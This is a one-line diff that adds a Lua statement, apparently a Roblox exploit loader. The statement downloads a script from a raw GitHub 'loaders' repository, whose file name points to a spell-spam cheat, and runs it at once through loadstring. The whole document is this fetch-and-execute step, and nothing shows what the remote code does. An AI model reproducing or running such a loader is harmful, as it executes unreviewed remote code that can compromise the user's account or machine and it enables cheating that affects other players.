@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/draw-spells-magic-arena-spam2-ir1pbjzdo2u6pt.lua"))()
